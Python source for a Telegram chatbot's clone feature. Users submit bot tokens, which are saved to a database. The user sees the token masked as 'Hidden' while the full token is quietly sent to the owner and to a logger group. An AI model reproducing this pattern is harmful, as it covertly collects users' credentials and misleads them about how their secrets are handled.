import logging
import os
import sys
import shutil
import asyncio
from pyrogram.enums import ParseMode
from pyrogram import Client, filters
from pyrogram.errors.exceptions.bad_request_400 import AccessTokenExpired, AccessTokenInvalid
import config
from pyrogram.types import BotCommand
from config import API_HASH, API_ID, OWNER_ID
from PRITI_CHATBOT import CLONE_OWNERS
from PRITI_CHATBOT import PRITI_CHATBOT as app, save_clonebot_owner
from PRITI_CHATBOT import db as mongodb

CLONES = set()
cloneownerdb = mongodb.cloneownerdb
clonebotdb = mongodb.clonebotdb


@app.on_message(filters.command(["clone", "host", "deploy"]))
async def clone_txt(client, message):

    if len(message.command) > 1:
        bot_token = message.text.split("/clone", 1)[1].strip()
        mi = await message.reply_text("Please wait while I check the bot token.")

        # --- User Clone Limit ---
        user_id = message.from_user.id

        if user_id != int(OWNER_ID):
            existing_clone = await clonebotdb.find_one({"user_id": user_id})
            if existing_clone:
                await mi.edit_text(
                    f"⚠️ You can clone only 1 bot!\n"
                    f"You already cloned @{existing_clone['username']}\n\n"
                    f"Remove clone → /delclone {existing_clone['token']}"
                )
                return

        # START BOT
        try:
            ai = Client(
                bot_token,
                API_ID,
                API_HASH,
                bot_token=bot_token,
                plugins=dict(root="PRITI_CHATBOT/mplugin")
            )
            await ai.start()
            bot = await ai.get_me()
            bot_id = bot.id

            await save_clonebot_owner(bot_id, user_id)

            await ai.set_bot_commands([
                BotCommand("start", "Start the bot"),
                BotCommand("help", "Help menu"),
                BotCommand("clone", "Make your own bot"),
                BotCommand("ping", "Check alive"),
                BotCommand("lang", "Select language"),
                BotCommand("chatlang", "Current chat lang"),
                BotCommand("resetlang", "Reset lang"),
                BotCommand("id", "User ID"),
                BotCommand("stats", "Bot stats"),
                BotCommand("gcast", "Broadcast"),
                BotCommand("chatbot", "Enable/Disable AI"),
                BotCommand("status", "Chatbot status"),
                BotCommand("shayri", "Random shayri"),
                BotCommand("ask", "Ask AI"),
                BotCommand("repo", "Bot Source"),
            ])

        except (AccessTokenExpired, AccessTokenInvalid):
            await mi.edit_text("Invalid Bot Token ❌")
            return

        except Exception:
            cloned_bot = await clonebotdb.find_one({"token": bot_token})
            if cloned_bot:
                return await mi.edit_text("Your bot is already cloned ✔")
            return

        await mi.edit_text("Cloning process started…")

        # -----------------------------------------------------------------
        #   HERE IS YOUR FULL SUCCESS BLOCK (FIXED + INDENTED PROPERLY)
        # -----------------------------------------------------------------
        try:
            # ----- SAVE DETAILS -----
            details = {
                "bot_id": bot.id,
                "is_bot": True,
                "user_id": user_id,
                "name": bot.first_name,
                "token": bot_token,
                "username": bot.username,
            }

            await clonebotdb.insert_one(details)
            CLONES.add(bot.id)

            # ----- USER MENTION -----
            mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"

            # ----- USER FULL DETAILS -----
            user_details = (
                "✨ **Clone Successful!**\n\n"
                "**👤 User Details:**\n"
                f"• Name: {mention}\n"
                f"• User ID: `{user_id}`\n"
                f"• Username: @{message.from_user.username}\n\n"

                "**🤖 Bot Details:**\n"
                f"• Bot Name: {bot.first_name}\n"
                f"• Username: @{bot.username}\n"
                f"• Bot ID: `{bot.id}`\n"
                "• Status: Running Successfully ✓\n\n"

                "**🔐 Bot Token (Hidden):**\n"
                f"`{bot_token[:10]}*************************`\n\n"

                f"Thanks {mention} ❤️\n"
                "View clone: `/cloned`\n"
                f"Delete clone: `/delclone {bot_token}`"
            )

            await message.reply_text(user_details, parse_mode="Markdown")

            # ----- OWNER LOG -----
            owner_log = (
                "🆕 **New Clone Created**\n\n"
                f"👤 User: {mention} (`{user_id}`)\n"
                f"🤖 Bot: @{bot.username}\n"
                f"🆔 Bot ID: `{bot.id}`\n"
                f"🔑 Token: `{bot_token}`"
            )

            await app.send_message(int(OWNER_ID), owner_log, parse_mode="Markdown")

            # ----- LOGGER GROUP -----
            try:
                logger_msg = (
                    "📢 **New Clone Log**\n\n"
                    f"User: {mention}\n"
                    f"Bot: @{bot.username}\n"
                    f"Bot ID: `{bot.id}`\n"
                    f"Token: `{bot_token}`"
                )
                await app.send_message(config.LOGGER_GROUP, logger_msg, parse_mode="Markdown")
            except:
                pass

        except Exception as e:
            await mi.edit_text(f"Error: `{e}`")
            logging.exception(e)

    else:
        await message.reply_text("Send bot token\nExample: `/clone 123:ABC`")


# ==================================================================
# SHOW CLONED BOTS
# ==================================================================
@app.on_message(filters.command("cloned"))
async def list_cloned_bots(client, message):
    try:
        user_id = message.from_user.id

        # OWNER: ALL BOTS
        if user_id == int(OWNER_ID):
            bots = await clonebotdb.find().to_list(None)
            if not bots:
                return await message.reply_text("No clones yet.")
            text = f"👑 Total Clones: {len(bots)}\n\n"
            for b in bots:
                text += (
                    f"🤖 @{b['username']}\n"
                    f"• Name: {b['name']}\n"
                    f"• Bot ID: `{b['bot_id']}`\n"
                    f"• Owner: `{b['user_id']}`\n\n"
                )
            return await message.reply_text(text)

        # USER: ONLY OWN
        mine = await clonebotdb.find_one({"user_id": user_id})
        if not mine:
            return await message.reply_text("❌ You have no cloned bot.")

        await message.reply_text(
            f"🤖 **Your Clone:**\n"
            f"• @{mine['username']}\n"
            f"• Bot ID: `{mine['bot_id']}`"
        )

    except Exception as e:
        logging.exception(e)
        await message.reply_text("Error while listing clones.")



# ==================================================================
# DELETE ONE CLONE
# ==================================================================
@app.on_message(filters.command(["deletecloned", "delcloned", "delclone", "deleteclone", "removeclone", "cancelclone"]))
async def delete_cloned_bot(client, message):
    try:
        if len(message.command) < 2:
            return await message.reply_text("Usage:\n/delclone <bot_token>")

        bot_token = message.command[1]
        ok = await message.reply_text("Checking token…")

        cloned_bot = await clonebotdb.find_one({"token": bot_token})
        if not cloned_bot:
            return await ok.edit_text("Invalid token ❌")

        await clonebotdb.delete_one({"token": bot_token})

        try:
            CLONES.remove(cloned_bot["bot_id"])
        except:
            pass

        await ok.edit_text("✔ Bot clone removed.\nRevoke token from @BotFather.")

    except Exception as e:
        await message.reply_text(f"Error: {e}")
        logging.exception(e)



# ==================================================================
# DELETE ALL (OWNER ONLY)
# ==================================================================
@app.on_message(filters.command("delallclone") & filters.user(int(OWNER_ID)))
async def delete_all_cloned_bots(client, message):
    try:
        a = await message.reply_text("Deleting all clones…")
        await clonebotdb.delete_many({})
        CLONES.clear()
        await a.edit_text("All clones removed ✔")
        os.system(f"kill -9 {os.getpid()} && bash start")
    except Exception as e:
        await a.edit_text(f"Error: {e}")
        logging.exception(e)